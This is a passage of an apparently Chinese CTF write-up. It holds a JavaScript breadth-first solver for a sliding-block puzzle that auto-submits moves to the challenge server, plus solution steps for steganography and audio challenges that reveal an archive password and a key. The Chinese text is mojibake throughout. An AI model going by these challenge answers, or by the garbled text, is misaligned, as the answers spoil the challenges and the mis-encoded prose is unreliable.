å•å…µ</span></span><br><span class="line"><span class="comment"> * 3 ç«–è¡Œ</span></span><br><span class="line"><span class="comment"> * 4 æ¨ªè¡Œ</span></span><br><span class="line"><span class="comment"> * 5 BOSS</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * äº¤æ¢æ•°ç»„çš„ä¸­å…ƒç´ ï¼Œå¦‚æœæ•°å­—æ˜¯ä¸¤ä¸ªæ•°å­—ï¼Œåˆ™äº¤æ¢ arr[i] å’Œ arr[j]</span></span><br><span class="line"><span class="comment">  * å¦‚æœå‚æ•°æ˜¯ä¸¤ä¸ªæ•°ç»„ï¼Œéœ€è¦ä¿è¯ä¸¤æ•°ç»„é•¿åº¦ç›¸ç­‰ï¼Œå°†æ•°ç»„ä¸­æ‰€æœ‰ index ä¾æ¬¡æ›¿æ¢</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> &#123;<span class="type">Number | Array</span>&#125; <span class="variable">i</span></span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> &#123;<span class="type">Number | Array</span>&#125; <span class="variable">j</span></span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">swap</span> = <span class="keyword">function</span> (<span class="params">i, j</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> i === <span class="string">&#x27;number&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> j === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="variable language_">this</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>[i] = <span class="variable language_">this</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>[j] = tmp;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i.<span class="property">length</span> === j.<span class="property">length</span>) &#123;</span><br><span class="line">        i.<span class="title function_">forEach</span>(<span class="function">(<span class="params">_, k</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> tmp = <span class="variable language_">this</span>[i[k]];</span><br><span class="line">            <span class="variable language_">this</span>[i[k]] = <span class="variable language_">this</span>[j[k]];</span><br><span class="line">            <span class="variable language_">this</span>[j[k]] = tmp;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos ä½ç½®çš„æ£‹å­å‘ä¸Šç§»åŠ¨ï¼Œè¿”å›ç§»åŠ¨åçš„æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos ä½ç½®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveUp</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos - <span class="number">4</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos - <span class="number">4</span>, pos]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos - <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos - <span class="number">4</span>, pos - <span class="number">3</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos - <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>, pos + <span class="number">4</span>, pos + <span class="number">5</span>], [pos - <span class="number">4</span>, pos - <span class="number">3</span>, pos, pos + <span class="number">1</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos ä½ç½®çš„æ£‹å­å‘ä¸‹ç§»åŠ¨ï¼Œè¿”å›ç§»åŠ¨åçš„æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos ä½ç½®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveDown</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos + <span class="number">4</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">8</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">4</span>, pos], [pos + <span class="number">8</span>, pos + <span class="number">4</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">4</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">5</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos + <span class="number">4</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">8</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">9</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">4</span>, pos + <span class="number">5</span>, pos, pos + <span class="number">1</span>], [pos + <span class="number">8</span>, pos + <span class="number">9</span>, pos + <span class="number">4</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos ä½ç½®çš„æ£‹å­å‘å·¦ç§»åŠ¨ï¼Œè¿”å›ç§»åŠ¨åçš„æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos ä½ç½®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveLeft</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos - <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos - <span class="number">1</span>, pos + <span class="number">3</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">1</span>], [pos - <span class="number">1</span>, pos]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos - <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">3</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; pos % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>, pos + <span class="number">1</span>, pos + <span class="number">5</span>], [pos - <span class="number">1</span>, pos + <span class="number">3</span>, pos, pos + <span class="number">4</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos ä½ç½®çš„æ£‹å­å‘å³ç§»åŠ¨ï¼Œè¿”å›ç§»åŠ¨åçš„æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos ä½ç½®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">moveRight</span> = (<span class="params">state, pos</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;2&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">1</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>(pos, pos + <span class="number">1</span>).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;3&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">1</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">5</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">1</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos, pos + <span class="number">4</span>], [pos + <span class="number">1</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;4&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">2</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">2</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">1</span>, pos], [pos + <span class="number">2</span>, pos + <span class="number">1</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (state[pos] === <span class="string">&#x27;5&#x27;</span>) <span class="keyword">return</span> state[pos + <span class="number">2</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; state[pos + <span class="number">6</span>] === <span class="string">&#x27;0&#x27;</span> &amp;&amp; (pos + <span class="number">2</span>) % <span class="number">4</span> &amp;&amp;</span><br><span class="line">        state.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">swap</span>([pos + <span class="number">1</span>, pos + <span class="number">5</span>, pos, pos + <span class="number">4</span>], [pos + <span class="number">2</span>, pos + <span class="number">6</span>, pos + <span class="number">1</span>, pos + <span class="number">5</span>]).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨ Array å®ç°çš„é˜Ÿåˆ—ï¼Œæœ¬ä»¥ä¸º Array åšé˜Ÿåˆ—å¯èƒ½ä¼šå½±å“æ€§èƒ½ï¼Œ</span></span><br><span class="line"><span class="comment"> * å®é™…å°è¯•å‘ç°æ²¡å•¥å½±å“ï¼Œä¸»è¦æ˜¯ç”±äºæ£‹ç›˜çŠ¶æ€æ•°å¤ªå°‘äº†ï¼Œä¸€èˆ¬ä¸åˆ°åä¸‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Queue</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">size</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">front</span> = <span class="variable language_">this</span>.<span class="property">tail</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">size</span> = size || <span class="number">1048576</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    push (data) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">fullFlag</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Can not push a value into a full queue!&#x27;</span>);</span><br><span class="line">        <span class="variable language_">this</span>[<span class="variable language_">this</span>.<span class="property">tail</span>++] = data;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tail</span> === <span class="variable language_">this</span>.<span class="property">size</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">tail</span> = <span class="number">0</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">tail</span> === <span class="variable language_">this</span>.<span class="property">front</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    shift () &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">tail</span> &amp;&amp; !<span class="variable language_">this</span>.<span class="property">fullFlag</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Can not shift a value from a empty queue!&#x27;</span>);</span><br><span class="line">        <span class="keyword">let</span> ret = <span class="variable language_">this</span>[<span class="variable language_">this</span>.<span class="property">front</span>++];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">size</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">front</span> = <span class="number">0</span>)</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">fullFlag</span> &amp;&amp; (<span class="variable language_">this</span>.<span class="property">fullFlag</span> = <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    empty () &#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">this</span>.<span class="property">fullFlag</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">front</span> === <span class="variable language_">this</span>.<span class="property">tail</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * pos ä½ç½®çš„æ£‹å­å‘å³ç§»åŠ¨ï¼Œè¿”å›ç§»åŠ¨åçš„æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; state æ£‹ç›˜çŠ¶æ€</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">number</span>&#125; pos ä½ç½®</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">let</span> getSolve = <span class="keyword">function</span> (<span class="params">state</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> que = [state], vst = &#123;[state]: <span class="number">1</span>&#125;, result = [];</span><br><span class="line">    <span class="keyword">while</span>(que.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> cur = que.<span class="title function_">shift</span>(), res = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cur[<span class="number">13</span>] === <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(; cur !== <span class="number">1</span>; cur = vst[cur])</span><br><span class="line">                result.<span class="title function_">push</span>(cur);</span><br><span class="line">            result.<span class="title function_">pop</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cur.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            (res = <span class="title function_">moveUp</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveDown</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveLeft</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">            (res = <span class="title function_">moveRight</span>(cur, i)) &amp;&amp; !vst[res] &amp;&amp; que.<span class="title function_">push</span>(res) &amp;&amp; (vst[res] = cur);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//console.log(getSolve(&#x27;35131111241222222002&#x27;));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// =====è‡ªå·±å†™çš„éƒ¨åˆ†======</span></span><br><span class="line"><span class="comment">// è·å–æ­¥æ•°</span></span><br><span class="line"><span class="keyword">let</span> step = <span class="keyword">function</span>(<span class="params">cur,result</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> steped = &#123;<span class="string">&quot;position&quot;</span>:<span class="number">0</span>,<span class="string">&quot;direction&quot;</span>:<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cur.<span class="property">length</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(cur[i] == result[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//console.log(i);</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveUp</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveRight</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveDown</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">res = <span class="title function_">moveLeft</span>(cur, i);</span><br><span class="line"><span class="keyword">if</span>(res == result)&#123;</span><br><span class="line">steped = &#123;<span class="string">&quot;position&quot;</span>:i,<span class="string">&quot;direction&quot;</span>:<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> steped;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// é€’å½’è§£å†³é—®é¢˜</span></span><br><span class="line"><span class="keyword">let</span> <span class="title class_">Solve</span> = <span class="keyword">function</span> (<span class="params">layout,gameId</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = <span class="title function_">getSolve</span>(layout);</span><br><span class="line"><span class="keyword">var</span> steps=[];</span><br><span class="line"><span class="keyword">while</span>(res.<span class="property">length</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">var</span> result = res.<span class="title function_">pop</span>();</span><br><span class="line">  steps.<span class="title function_">push</span>(<span class="title function_">step</span>(layout,result));</span><br><span class="line">  layout = result;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// è§£å†³å®Œå‘é€è¿‡å»</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://106.14.57.14:30674/api/submit/&#x27;</span> +gameId, &#123;</span><br><span class="line"><span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line"><span class="attr">headers</span>: &#123;</span><br><span class="line">  <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(steps)</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>();</span><br><span class="line">  &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (data.<span class="property">status</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;next&quot;</span>:</span><br><span class="line"><span class="title class_">Solve</span>(data.<span class="property">game_stage</span>.<span class="property">layout</span>,gameId);<span class="comment">//å¦‚æœæ˜¯nextå°±é€’å½’</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"><span class="attr">default</span>:</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¸¸æˆå¼€å§‹</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://106.14.57.14:30674/api/newgame&#x27;</span>)</span><br><span class="line">.<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>();</span><br><span class="line">      &#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">  <span class="title class_">Solve</span>(data.<span class="property">layout</span>,data.<span class="property">gameId</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/m_2_1.png"></p><h2 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h2><p>æŠŠ<code>è¿™æ˜¯ä¸€ä¸ªwordæ–‡ä»¶.docx</code>æ”¹æˆ<code>è¿™æ˜¯ä¸€ä¸ªwordæ–‡ä»¶.zip</code>ï¼Œè§£å‹åå¯ä»¥æ‰¾åˆ°ä¸€ä¸ª<code>media</code>æ–‡ä»¶å¤¹ã€‚</p><p>æ¥ç€æ˜¯ç›²æ°´å°ï¼Œå·¥å…·é“¾æ¥ï¼š<a href="https://github.com/chishaxie/BlindWaterMark">BlindWaterMark</a></p><p>ç›²æ°´å°è§£å‡ºæ¥å¯ä»¥å¾—åˆ°å‹ç¼©åŒ…å¯†ç ä¸º<code>T1hi3sI4sKey</code>ã€‚</p><p>è§£å‹å¾—åˆ°ä¸€ä¸ª<code>secret.txt</code>ï¼Œæœç¬¬ä¸€è¡Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªç±»ä¼¼çš„é¢˜ã€‚</p><p><img src="/./hgame2024_week2/m_3_1.png"></p><p>å·¥å…·é“¾æ¥ï¼š<a href="http://www.spammimic.com/">spam mimic</a></p><p>è§£ç åå¯ä»¥å¾—åˆ°ä¸€ä¸²ç¹ä½“å­—</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç±±ç±°ç±ªç±¶ç±®ç²„ç°¹ç±´ç±¨ç²‚ç±¸ç±¾ç±¨ç±¼ç°¹ç±µç±¿ç±®ç±¨ç±ªç±µç°ºç±¨ç±½ç±±ç°¼ç±¨ç±¼ç±®ç±¬ç±»ç°¼ç±½ç²†</span><br></pre></td></tr></table></figure><p>æ¥ç€æ˜¯ROT8000ï¼Œåœ¨çº¿ç½‘ç«™ï¼š<a href="https://www.dcode.fr/rot8000-cipher#f0">ROT8000å¯†ç </a></p><p>è§£ç åå³å¯å¾—åˆ°flagã€‚</p><p><img src="/./hgame2024_week2/m_3_2.png"></p><h2 id="é¾™ä¹‹èˆ"><a href="#é¾™ä¹‹èˆ" class="headerlink" title="é¾™ä¹‹èˆ"></a>é¾™ä¹‹èˆ</h2><p>audacityæŸ¥çœ‹éŸ³é¢‘ï¼Œè°ƒèŠ‚ä¸€ä¸‹é‡‡æ ·ç‡ï¼Œå¯ä»¥çœ‹åˆ°keyã€‚</p><p><img src="/./hgame2024_week2/m_4_1.png"></p><p>ä¸Šä¸‹ç¿»è½¬ä¸€ä¸‹ï¼Œå¾—åˆ°æ­£ç¡®çš„keyä¸º <code>5H8w1nlWCX3hQLG</code> ã€‚</p><p><img 